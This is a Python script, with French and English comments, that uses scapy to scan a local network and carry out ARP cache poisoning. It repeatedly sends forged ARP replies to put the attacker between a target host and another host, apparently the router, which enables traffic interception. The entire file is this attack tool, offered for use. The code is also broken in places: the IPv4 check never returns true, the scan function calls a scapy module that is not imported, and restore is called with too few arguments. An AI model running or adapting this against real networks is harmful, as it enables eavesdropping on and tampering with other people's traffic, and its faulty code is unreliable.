#!/usr/bin/env python
# using scapy 
from scapy.all import Ether, ARP, srp, send, conf
import argparse
import sys
import time
from ipaddress import ip_address, IPv4Address

def checkipv4(ip: str):
    try:
        type(ip_address(ip)) is IPv4Address
    except ValueError:
        return 0

def checkMac(ip: str, mac: str):
    clients_list = scan(ip)
    for client in clients_list:
        if client["ip"] == ip:
            if client["mac"] == mac:
                return 1
            else:
                return 0

def poisoning(target_ip, spoof_ip, target_mac):
# Will change ARP table on target host. Router Mac address will be replaced
    packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op=2)
    send(packet, verbose=0)

def restore(target_ip, spoof_ip, mac1, mac2):
    packet = ARP(pdst=target_ip, hwdst=mac1, psrc=spoof_ip, hwsrc=mac2, op=2)
    send(packet, verbose=0, count=4)

def scan(ip): # requete arp pour recuperer l'adresse mac de l'hote
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # add broadcast
    arp_request_broadcast = broadcast/arp_request # le paquet avec la requête
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, #recuperer les reponses
                                verbose=False)[0]
    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)
    print("IP\t\t\tMAC Address")
    print("----------------------------------------------------")
    for client in clients_list:
        print(client["ip"] + "\t\t" + client["mac"])
    return clients_list

def parse_arguments():
    parser = argparse.ArgumentParser()
    
    # Ajoutez l'option pour le scan
    parser.add_argument("-s", "--scan", dest="scan_ip", help="Scan IP")

    # Ajoutez les arguments pour <IP-src> <MAC-src> <IP-target> <MAC-target>
    parser.add_argument("ip_src", nargs="?", help="Source IP")
    parser.add_argument("mac_src", nargs="?", help="Source MAC")
    parser.add_argument("ip_target", nargs="?", help="Target IP")
    parser.add_argument("mac_target", nargs="?", help="Target MAC")

    return parser.parse_args()

def main():
    args = parse_arguments()
    if args.scan_ip:
        scan(args.scan_ip)
        sys.exit(1)
    elif any(arg is None for arg in [args.ip_src, args.mac_src, args.ip_target, args.mac_target]):
        print("Error: you must provide these 4 parameters : <IP-src> <MAC-src> <IP-target> <MAC-target> or use -s or --scan'")
        sys.exit(1)

    if not checkipv4(args.ip_src) or not checkipv4(args.ip_target):
        print("Error: you must provide valid IPv4 addresses")
        sys.exit(1)
    if not checkMac(args.ip_src, args.mac_src) or not checkMac(args.ip_target, args.mac_target):
        print("Error: invalid Mac address. Use -s or --scan.")
        sys.exit(1)

    sent_packets_count = 0
    try:
        while True:
            print("Starting poisoning..")
            poisoning(args.ip_src, args.ip_target, args.mac_src) # First time to update target arp table
            poisoning(args.ip_target, args.ip_src, args.mac_target) # Second time to update router arp table
            sent_packets_count +=2
            print(f"\r[+] Packets sent: {sent_packets_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
        restore(args.ip_src, args.ip_target, args.mac_src)
        restore(args.ip_target, args.ip_src, args.mac_target)

if __name__ == "__main__":
    main()